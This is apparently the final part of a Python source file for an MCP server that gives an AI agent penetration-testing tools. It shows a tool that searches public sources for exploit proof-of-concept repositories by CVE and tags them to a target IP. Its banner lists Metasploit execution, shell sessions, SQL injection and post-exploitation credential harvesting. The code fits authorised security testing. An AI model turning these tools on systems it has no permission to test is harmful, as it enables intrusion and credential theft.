            console.print(f"[green]Saved finding #{result.get('id')}[/]")
        return result

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # CVE ENRICHMENT — Live lookup from Vulners + NVD + Exploit-DB
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    if _HAS_CVE_ENRICHMENT:
        # Import PoC lookup functions
        from cve_enrichment import lookup_poc_all, print_poc_results

        register_cve_tools(mcp)
        logger.info("CVE enrichment tools registered: lookup_cve, lookup_multiple_cves, search_service_cves, search_service_cves_deep, enrich_scan_cves, download_poc")

        @mcp.tool(name="search_poc_repos")
        async def search_poc_repos(
            cve_id: str,
            save_target: str = "",
        ) -> Dict:
            """
            Search for PoC/exploit repositories across all sources:
              * nomi-sec/PoC-in-GitHub     — curated PoC repos per CVE
              * ycdxsb/PocOrExp_in_Github  — aggregated PoC repos per year
              * trickest/cve               — curated per-CVE entries
              * GitHub Search API          — star-sorted global PoC search
              * sploitus.com               — exploit search results (RSS)
              * Metasploit + Nuclei        — other exploit sources
              * Vulhub Docker environments — pre-built vulnerable environments

            Tries the Adara server first (if reachable), falls back to direct API calls.
            Results are saved as findings if save_target is set.

            Args:
                cve_id:      e.g. "CVE-2021-44228" or "CVE-2002-20001"
                save_target: Optional target IP to tag findings against

            Returns:
                all_repos: list of PoC repos with html_url, stars, forks, description
                sploitus: exploits from sploitus.com (if found)
                total_repos: total unique repo count
            """
            cve_id = cve_id.upper().strip()
            if not cve_id.startswith("CVE-"):
                cve_id = f"CVE-{cve_id}"

            console.print(f"[cyan]PoC repo search:[/] {cve_id} -> all 7 sources")

            # Try server endpoint first (faster, cached)
            result = None
            try:
                server_result = await client.post("/api/poc/search", {"cve_id": cve_id})
                if "error" not in server_result and server_result.get("total_repos", 0) > 0:
                    result = server_result
                    console.print(f"[dim]via server proxy[/]")
            except Exception:
                pass

            # Fall back to direct call
            if not result:
                result = await lookup_poc_all(cve_id)

            # Save findings
            if save_target and result.get("all_repos"):
                for repo in result["all_repos"]:
                    await _ldb.save(
                        target=save_target,
                        tool="search_poc_repos",
                        category="poc",
                        title=f"PoC: {repo.get('full_name', repo.get('html_url', ''))}",
                        detail=f"{repo.get('stars', 0)} stars, {repo.get('forks', 0)} forks - {repo.get('description', '')[:300]}",
                        severity="info",
                        scan_command=f"search_poc_repos({cve_id})",
                    )
                console.print(f"[green]Saved {len(result['all_repos'])} PoC findings for {save_target}[/]")

            print_poc_results(result)
            return result

    return mcp


# ─────────────────────────────────────────────
# Startup banner
# ─────────────────────────────────────────────
def print_banner(server_url: str):
    cve_status = "[green]✓[/]" if _HAS_CVE_ENRICHMENT else "[red]✗[/]"
    console.print(Panel(
        f"[bold cyan]Adara MCP Server[/] [dim]— Advanced Edition[/]\n\n"
        f"[green]Server:[/]  {server_url}\n"
        f"[green]DB:[/]      {DB_PATH}\n"
        f"[green]Tools:[/]   nmap · gobuster · nikto · sqlmap · hydra · john · nuclei\n"
        f"           wpscan · enum4linux · metasploit · ffuf · wafw00f\n"
        f"           crackmapexec · curl (parallel) · ssh (asyncssh)\n\n"
        f"[yellow]Parallel:[/] parallel_scan, staged_scan, multi_curl\n"
        f"[yellow]Nuclei:[/]  nuclei_scan (9000+ templates: cves, misconfig, exposure)\n"
        f"[yellow]CVE DB:[/]  {cve_status} lookup_cve, search_service_cves(+deep), enrich_scan_cves, search_poc_repos\n"
        f"[yellow]Analysis:[/] smart_analyze (CVE flagging + attack chains + delta tracking)\n"
        f"[yellow]Reports:[/] generate_report, analysis_history, finding_status\n"
        f"[yellow]Sessions:[/] session_create/send/read/status (netcat, msfconsole, bash, direct_shell)\n"
        f"[yellow]MSF:[/]     msf_interactive_run (all modules: exploit/auxiliary/post/handler)\n"
        f"[yellow]MSF:[/]     msf_search, msf_info, msf_session_interact, msf_session_list\n"
        f"[yellow]SSH:[/]     ssh_connect/exec/upload/download (persistent, no sshpass)\n"
        f"[yellow]Post-Exp:[/] post_enum_system, post_enum_privesc, post_harvest_creds\n"
        f"[yellow]Memory:[/]  save_finding, get_findings, get_target_profile\n"
        f"[yellow]Bg Jobs:[/] scan_start/status/wait/list/kill (detached — no -32001 timeout)\n"
        f"[yellow]Bg Flag:[/] background=True on sqlmap/ffuf/nmap/gobuster/nikto/hydra/wpscan/nuclei\n"
        f"[yellow]Blind SQLi:[/] blind_extract(url, payload_template) — server-side SLEEP binary search\n"
        f"[yellow]Templates:[/] request_template_save/list/get/run/delete\n"
        f"[yellow]Curl Fix:[/] curl_request(..., encode_url=True); shell-safe quoting by default\n"
        f"[yellow]Dedup:[/]   SHA256 hash dedup · status workflow · JSON targets",
        title="⚡ Adara MCP v2",
        border_style="bold magenta",
    ))


# ─────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(description="Adara MCP Server v2")
    p.add_argument("--server",  default=DEFAULT_SERVER,  help=f"Adara API server URL (default: {DEFAULT_SERVER})")
    p.add_argument("--timeout", default=DEFAULT_TIMEOUT, type=int)
    p.add_argument("--debug",   action="store_true")
    return p.parse_args()

def main():
    args = parse_args()
    if args.debug:
        logger.remove()
        logger.add(sys.stderr, level="DEBUG", colorize=True)

    print_banner(args.server)

    # Health check
    async def _check():
        client = AdaraClient(args.server, args.timeout)
        try:
            health = await client.get("/health")
            if "error" in health:
                console.print(f"[yellow]⚠  Cannot reach {args.server}: {health['error']}[/]")
                console.print("[dim]MCP server will start but tool calls may fail until Adara API is up[/]")
            else:
                console.print(f"[green]✅ Connected to Adara API at {args.server}[/]")
                missing = [t for t, ok in health.get("tools_status",{}).items() if not ok]
                if missing:
                    console.print(f"[yellow]⚠  Missing tools: {', '.join(missing)}[/]")
        finally:
            # FIX: startup-only client leaked its httpx pool (2 connections
            # held forever); close it after the health check.
            # FIX2: this was `client.aclose()` — AdaraClient has no aclose()
            # (only async close()), so the finally raised AttributeError and
            # CRASHED MCP startup on every run, healthy server or not.
            await client.close()

    asyncio.run(_check())

    # Build and run MCP
    adara_client = AdaraClient(args.server, args.timeout)
    mcp = setup_mcp(adara_client)
    logger.info("Starting MCP server (stdio transport)")
    mcp.run()

if __name__ == "__main__":
    main()